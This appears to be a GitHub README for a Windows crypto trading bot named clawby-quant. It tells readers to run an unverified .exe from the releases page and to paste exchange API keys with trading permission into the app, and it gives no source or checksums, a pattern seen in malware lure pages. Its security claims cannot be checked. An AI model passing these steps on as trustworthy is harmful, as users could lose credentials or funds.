# 📈 clawby-quant - Build automated crypto trading systems easily

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sudaissh9246/clawby-quant/releases)

Clawby-quant turns your computer into a trading workstation. This software manages crypto trades using pre-built mathematical models. It tracks market prices, executes orders, and displays your account balance in a window on your desktop. Your private keys stay on your machine, which keeps your account data secure.

## 🛠️ System Requirements

You need a standard Windows PC to run this software. Ensure you have the following:

- Windows 10 or Windows 11.
- An internet connection for live data.
- At least 8GB of RAM.
- A stable power supply for continuous operation.

## 📥 How to Install

Follow these steps to set up the software on your computer.

1. Visit the [official release page](https://github.com/sudaissh9246/clawby-quant/releases).
2. Look for the latest version listed under Assets.
3. Click the file ending in .exe to start the download.
4. Save the file to a folder on your computer.
5. Double-click the file to start the installation.
6. Follow the prompts on the screen to finish the setup.

## 🚀 Setting Up Your Account

Once the installation finishes, double-click the desk icon to open the application. You must connect your trading account to enable the software.

1. Open your crypto exchange website in your browser.
2. Navigate to your account settings and select API Management.
3. Create a new API key with permissions for reading and trading.
4. Copy your API Key and Secret Key. 
5. Paste these keys into the Settings menu inside clawby-quant.
6. Click Save to apply your changes.

## 📊 Using the Dashboard

The main screen shows your performance. The top half displays your current account balance. The bottom half shows active trades and recent price changes. You can toggle between paper trading and live trading via the switch at the top right of the application. 

Paper trading uses virtual money to test your strategy. We recommend this mode for the first few weeks. It allows you to watch market movements without risking real funds. Once you feel comfortable with the results, you can switch to live mode to trade with actual currency.

## ⚙️ Selecting Strategies

The strategy library contains sets of rules the system follows to make trades. Each strategy targets different market behaviors. 

1. Navigate to the Strategy tab in the sidebar.
2. Browse the list of available strategies. 
3. Click a strategy to view its details.
4. Adjust the parameters to change how the strategy executes orders.
5. Click Activate to run the strategy.

The software monitors market conditions and applies your chosen strategy automatically. You can stop any active strategy at any time by clicking the Stop button in the dashboard.

## 🛡️ Managing Risks

Trading crypto involves risk. The software provides tools to help you manage your positions. Always set a stop-loss limit to define how much you are willing to lose on a single trade. Keep your API keys confidential and do not share them with anyone. If you suspect someone has accessed your keys, delete them immediately from your exchange account and generate new ones.

## 📋 Frequently Asked Questions

Does the software need the computer to stay awake? 
Yes, the software must remain open and connected to the internet to place trades. Put your computer in sleep mode only when you want to pause all trading activity.

Can I run multiple strategies at once?
Yes, you can enable multiple strategies on the same account. Keep in mind that running too many strategies can lead to complex trade overlap.

What happens if the internet cuts out?
The software pauses order execution until it reconnects to the network. It will sync your account state once the connection returns.

Are there monthly fees?
The software operates locally. You pay no monthly subscription fees to the developers.

Where can I report errors?
Use the Issues tab on the GitHub repository to report any bugs you find. Include a description of the error and the steps you took to trigger it.
